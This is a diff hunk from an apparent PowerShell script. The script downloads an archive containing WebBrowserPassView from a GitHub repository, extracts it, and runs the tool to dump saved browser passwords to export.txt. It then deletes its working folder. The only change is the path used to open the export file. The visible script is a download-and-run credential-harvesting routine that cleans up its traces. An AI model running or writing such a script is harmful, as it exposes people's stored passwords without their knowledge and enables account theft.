@@ -12,7 +12,7 @@ Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPass
 Expand-Archive $zipFolder -DestinationPath $unzipFolder
 
 cmd /c ".\viewer\WebBrowserPassView\WebBrowserPassView.exe /stext export.txt"
-export.txt
+.\export.txt
 
 Remove-Item -Path $newDir -Recurse
 
